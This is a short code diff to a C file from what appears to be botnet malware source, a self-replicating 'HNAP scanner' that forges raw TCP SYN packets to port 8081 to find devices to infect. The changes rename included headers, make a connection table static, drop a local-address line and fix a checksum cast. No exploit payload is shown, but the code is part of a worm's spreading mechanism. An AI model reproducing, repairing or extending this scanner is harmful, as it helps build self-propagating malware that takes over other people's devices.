@@ -14,19 +14,17 @@
 #include <signal.h>
 #include <errno.h>
 #include <string.h>
-#include <linux/ip.h>
-#include <linux/tcp.h>
 
 #include "includes.h"
 #include "selfrep_hnap.h"
-#include "selfrep_table.h"
-#include "selfrep_rand.h"
-#include "selfrep_util.h"
-#include "selfrep_checksum.h"
+#include "table.h"
+#include "rand.h"
+#include "util.h"
+#include "checksum.h"
 
 int hnapscanner_scanner_pid = 0, hnapscanner_rsck = 0, hnapscanner_rsck_out = 0;
 char hnapscanner_scanner_rawpkt[sizeof(struct iphdr) + sizeof(struct tcphdr)] = {0};
-struct hnapscanner_scanner_connection *conn_table;
+static struct hnapscanner_scanner_connection *conn_table;
 uint32_t hnapscanner_fake_time = 0;
 
 int hnapscanner_recv_strip_null(int sock, void *buf, int len, int flags)
@@ -61,7 +59,6 @@ void hnapscanner_scanner_init(void)
     if(hnapscanner_scanner_pid > 0 || hnapscanner_scanner_pid == -1)
         return;
 
-    LOCAL_ADDR = util_local_addr();
 
     rand_init();
     hnapscanner_fake_time = time(NULL);
@@ -146,7 +143,7 @@ void hnapscanner_scanner_init(void)
                 tcph->dest = htons(8081);
                 tcph->seq = iph->daddr;
                 tcph->check = 0;
-                tcph->check = checksum_tcpudp(iph, tcph, htons(sizeof(struct tcphdr)), sizeof(struct tcphdr));
+                tcph->check = checksum_tcpudp(iph, (uint16_t *)tcph, htons(sizeof(struct tcphdr)), sizeof(struct tcphdr));
 
                 paddr.sin_family = AF_INET;
                 paddr.sin_addr.s_addr = iph->daddr;
